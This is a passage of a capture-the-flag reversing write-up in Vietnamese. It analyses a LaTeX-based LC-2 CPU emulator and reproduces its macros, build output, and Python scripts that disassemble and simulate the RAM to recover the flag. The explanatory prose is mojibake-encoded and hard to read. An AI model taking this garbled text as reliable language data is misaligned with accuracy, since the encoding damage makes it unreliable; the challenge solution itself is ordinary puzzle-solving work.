            \ifnum \value{mem\j_\i}=1%
                \immediate\write18{echo 1 &gt;&gt; DUMP}
            \else
                \immediate\write18{echo 0 &gt;&gt; DUMP}
            \fi
        }
    }
    \lgl{RAM DUMPED SUCCESSFULLY}
    \immediate\closeout\myoutput
}%
</code></pre><p><code>\printCPU</code> :</p>
<pre tabindex="0"><code>\newcommand{\printCPU}{
    \td{R0}
    \prr{R0}{\arabic{temp}}{0x\hexa{temp}}
    \td{R1}
    \prr{R1}{\arabic{temp}}{0x\hexa{temp}}
    \td{R2}
    \prr{R2}{\arabic{temp}}{0x\hexa{temp}}
    \td{R3}
    \prr{R3}{\arabic{temp}}{0x\hexa{temp}}
    \td{R4}
    \prr{R4}{\arabic{temp}}{0x\hexa{temp}}
    \td{R5}
    \prr{R5}{\arabic{temp}}{0x\hexa{temp}}
    \td{R6}
    \prr{R6}{\arabic{temp}}{0x\hexa{temp}}
    \td{R7}
    \prr{R7}{\arabic{temp}}{0x\hexa{temp}}
    \tdu{PC}
    \prr{PC}{\arabic{temp}}{0x\hexa{temp}}
    \tdu{IR}
    \prr{IR}{\arabic{temp}}{0x\hexa{temp}}
    \ifnum \value{CC0}=1%
    \prr{CC}{(N)}{0x4}%
    \else{%
    \ifnum \value{CC1}=1%
    \prr{CC}{(Z)}{0x2}%
    \else%
    \prr{CC}{(P)}{0x1}%
    \fi%
    }%
    \fi%
}
</code></pre><p>L·ªánh <code>\setup</code> t·∫°o ra nhi·ªÅu b·ªô ƒë·∫øm kh√°c nhau, sau ƒë√≥ ƒëi·ªÅn m·ªôt s·ªë b·ªô ƒë·∫øm b·∫±ng <code>\lr</code>. Trong m√¥ t·∫£ c·ªßa l·ªánh n√†y th√¨ n√≥ ghi <code>RAM loaded into emulated memory</code>. Load file RAM v√†o b·ªô nh·ªõ gi·∫£ l·∫≠p ?</p>
<p>L·ªánh <code>\fetchdecodeexecwriteback</code> load c√°c s·ªë nh·ªã ph√¢n v√†o c√°c &lsquo;IR&rsquo; t·ª´ &lsquo;b·ªô nh·ªõ&rsquo;. N·∫øu nh∆∞ gi·∫£ l·∫≠p CPU nh∆∞ n√≥ m√¥ t·∫£ th√¨ IR li·ªáu c√≥ ph·∫£i &lsquo;Instruction Register&rsquo; ? Ti·∫øp ƒë√≥ l·ªánh n√†y ki·ªÉm tra t·ª´ng gi√° tr·ªã bit x√°c ƒë·ªãnh c√°c Opcode ( m√¨nh ƒëo√°n d·ª±a v√†o c√°c gi√° tr·ªã ADD, LDI, RET,&hellip; C·ªông v·ªõi vi·ªác n√≥ m√¥ t·∫£ n√≥ l√† CPU gi·∫£ l·∫≠p, ƒë√¢y c√≥ v·∫ª nh∆∞ l√† c√°c c√¢u l·ªánh trong Ki·∫øn tr√∫c t·∫≠p l·ªánh (ISA) c·ªßa CPU ƒë∆∞·ª£c gi·∫£ l·∫≠p).</p>
<p>L·ªánh <code>\printCPU</code> in c√°c th√¥ng tin c·ªßa c√°c thanh ghi.</p>
<p>Oke v·∫≠y l√† ch√∫ng ta ƒë√£ ph√¢n t√≠ch c∆° b·∫£n v·ªÅ m√£ ngu·ªìn, m√¨nh s·∫Ω th·ª≠ ch·∫°y n√≥ xem sao.</p>
<h3 id="2-dynamic-analysis">2. Dynamic Analysis</h3>
<p>D√πng l·ªánh <code>make run</code> ƒë·ªÉ ch·∫°y c√°c l·ªánh b√™n trong Makefile.</p>
<p></p>
<p></p>
<p>T√≥m g·ªçn l·∫°i output nh∆∞ sau</p>
<pre tabindex="0"><code>echo &#34;&#34; &gt; DUMP
pdflatex --shell-escape interpreted.tex &gt; /dev/null

LC-2&gt;   Setting up everything, please be patient...

LC-2&gt;   Ready to read memory...

LC-2&gt;   RAM loaded into emulated memory...
[ C√°c b·∫£ng m√¥ t·∫£ d·ªØ li·ªáu trong Register ]
LC-2&gt;   Found a TRAP...

LC-2&gt;   Execution has ended...

LC-2&gt;   Ready to dump memory...

LC-2&gt;   RAM DUMPED SUCCESSFULLY...

.-------.-------.-------.
|R0     |3772   |0xEBC  |
.-------.-------.-------.
|R1     |3      |0x3    |
.-------.-------.-------.
|R2     |3769   |0xEB9  |
.-------.-------.-------.
|R3     |0      |0x0    |
.-------.-------.-------.
|R4     |0      |0x0    |
.-------.-------.-------.
|R5     |0      |0x0    |
.-------.-------.-------.
|R6     |0      |0x0    |
.-------.-------.-------.
|R7     |0      |0x0    |
.-------.-------.-------.
|PC     |278    |0x116  |
.-------.-------.-------.
|IR     |61477  |0xF025 |
.-------.-------.-------.
|CC     |(P)    |0x1    |
tr -d &#39;\n&#39; &lt; DUMP
[ M·ªôt d√£y c√°c gi√° tr·ªã nh·ªã ph√¢n m√† v·ªõi d√≤ng &#39;RAM DUMPED SUCCESSFULLY&#39;, c√≥ th·ªÉ ƒëo√°n l√† RAM sau khi th·ª±c thi]
</code></pre><p>Shell c·ªßa CPU gi·∫£ l·∫≠p ghi l√† LC-2, M√¨nh quy·∫øt ƒë·ªãnh research xem LC-2 l√† g√¨ ƒë·ªÉ hi·ªÉu ki·∫øn tr√∫c t·∫≠p l·ªánh c·ªßa n√≥. ƒê√¢y l√† ki·∫øn tr√∫c c·ªßa 1 m√°y t√≠nh gi·∫£ l·∫≠p Little Computer 2. C√≥ th·ªÉ tham kh·∫£o reference c·ªßa n√≥ t·∫°i ƒë√¢y: <a href="https://www.cs.utexas.edu/~fussell/courses/cs310h/simulator/lc2.pdf" target="_blank" rel="noopener noreffer ">https://www.cs.utexas.edu/~fussell/courses/cs310h/simulator/lc2.pdf</a></p>
<p>D·ª±a theo t√†i li·ªáu n√†y m√¨nh vi·∫øt 1 script ƒë·ªÉ d·ªãch c√°c Opcode d·ªÖ ƒë·ªçc h∆°n.</p>
<pre tabindex="0"><code>with open(&#34;RAM&#34;) as f:
    RAM = f.read()
f.close()
RAM = [&#39;&#39;.join(RAM.split(&#34;,&#34;))[16*i:16*(i+1)] for i in range(len(RAM.split(&#34;,&#34;))//16)][1:]
map = {
    &#34;0001&#34;: &#34;ADD  &#34;,
    &#34;0101&#34;: &#34;AND  &#34;,
    &#34;0000&#34;: &#34;BR   &#34;,
    &#34;0100&#34;: &#34;JSR  &#34;,
    &#34;1100&#34;: &#34;JSRR &#34;,
    &#34;0010&#34;: &#34;LD   &#34;,
    &#34;1010&#34;: &#34;LDI  &#34;,
    &#34;0110&#34;: &#34;LDR  &#34;,
    &#34;1110&#34;: &#34;LEA  &#34;,
    &#34;1001&#34;: &#34;NOT  &#34;,
    &#34;1101&#34;: &#34;RET  &#34;,
    &#34;1000&#34;: &#34;RTI  &#34;,
    &#34;0011&#34;: &#34;ST   &#34;,
    &#34;1011&#34;: &#34;STI  &#34;,
    &#34;0111&#34;: &#34;STR  &#34;,
    &#34;1111&#34;: &#34;TRAP &#34;
}

RAM = &#39;\n&#39;.join([map[i[0:4]]+i[4:] for i in RAM])

print(RAM)
</code></pre><p></p>
<p>Nh√¨n th√¨ c√≥ v·∫ª d√†i nh∆∞ng m√¨nh th·∫•y ƒë√¢y l√† m·ªôt chu·ªói c√°c kh·ªëi l·ªánh l·∫∑p l·∫°i.</p>
<pre tabindex="0"><code>LD R2, ??
LD R1, ??
ADD R0, R1, R2
ST R0, ??
Trap x25
BR ?
.....
</code></pre><p>Ph·∫ßn c√≤n l·∫°i c√≥ v·∫ª kh√¥ng c√≥ √Ω nghƒ©a, v√¨ th·∫ø m√¨nh t·∫≠p trung v√†o c√°c kh·ªëi l·ªánh n√†y. ·ªû ƒë√¢y l·ªánh <code>Trap x25</code> s·∫Ω l√†m ch∆∞∆°ng tr√¨nh d·ª´ng th·ª±c thi ·ªü m·ªói kh·ªëi l·ªánh, do v·∫≠y ƒë·ªÉ m√¥ ph·ªèng l·∫°i ch√≠nh x√°c ch∆∞∆°ng tr√¨nh l√†m g√¨ m√¨nh s·∫Ω patch s·∫°ch c√°c c√¢u l·ªánh n√†y v·ªÅ nope.</p>
<p>Nh∆∞ v·∫≠y √Ω t∆∞·ªüng s·∫Ω l√† patch t·∫•t c·∫£ c√°c c√¢u l·ªánh <code>Trap x25</code> b·∫±ng nop v√† b·ªè qua c√°c l·ªánh c√≤n l·∫°i, th·ª≠ interpret c√°c gi√° tr·ªã t·ª´ RAM r·ªìi ch·∫°y xem. K·∫øt qu·∫£ th√¨ m√¨nh thu ƒë∆∞·ª£c flag.</p>
<p></p>
<h3 id="3-script">3. Script</h3>
<pre tabindex="0"><code>state = {
    &#34;PC&#34;: 0,
    &#34;registers&#34;: [0,0,0,0,0,0,0,0],
    &#34;RAM&#34; : None
}

def RAMload():
    global state
    with open(&#34;RAM&#34;) as f:
        state[&#34;RAM&#34;] = f.read()
    f.close()
    state[&#34;RAM&#34;] = [&#39;&#39;.join(state[&#34;RAM&#34;].split(&#34;,&#34;))[16*i:16*(i+1)] for i in range(len(state[&#34;RAM&#34;].split(&#34;,&#34;))//16)][1:]

def simulate():
    global state
    map = {
        &#34;0001&#34;: add,
        &#34;0101&#34;: nope,
        &#34;0000&#34;: jump,
        &#34;0100&#34;: nope,
        &#34;1100&#34;: nope,
        &#34;0010&#34;: load,
        &#34;1010&#34;: nope,
        &#34;0110&#34;: nope,
        &#34;1110&#34;: nope,
        &#34;1001&#34;: nope,
        &#34;1101&#34;: nope,
        &#34;1000&#34;: nope,
        &#34;0011&#34;: store,
        &#34;1011&#34;: nope,
        &#34;0111&#34;: nope,
        &#34;1111&#34;: trap
    }
    while state[&#34;PC&#34;] != len(state[&#34;RAM&#34;]):
        curr_instruction = state[&#34;RAM&#34;][state[&#34;PC&#34;]]
        map[curr_instruction[:4]](curr_instruction[4:])
    print()

def nope(data):
    pass

def add(data):
    global state
    state[&#34;registers&#34;][0] = state[&#34;registers&#34;][1] + state[&#34;registers&#34;][2]
    print(chr(state[&#34;registers&#34;][0]),end=&#39;&#39;)
    state[&#34;PC&#34;] += 1

def jump(data):
    global state
    addr = int(data[3:],2)
    if addr:
        state[&#34;PC&#34;] = addr
    else:
        state[&#34;PC&#34;] += 1

def load(data):
    global state
    DR = int(data[:3],2)
    addr = int(data[3:],2)
    state[&#34;registers&#34;][DR] = int(state[&#34;RAM&#34;][addr],2)
    state[&#34;PC&#34;] += 1

def store(data):
    global state
    state[&#34;PC&#34;] += 1

def trap(data):
    global state
    state[&#34;PC&#34;] += 1

def print_state():
    global state
    print(&#34;PC: {PC} R0: {R0} R1: {R1} R2: {R2}&#34;.format(PC=state[&#34;PC&#34;],R0=state[&#34;registers&#34;][0],R1=state[&#34;registers&#34;][1],R2=state[&#34;registers&#34;][2]))

if __name__ == &#34;__main__&#34;:
    RAMload() 
    simulate() 
</code></pre>]]></description>
</item>
</channel>
</rss>
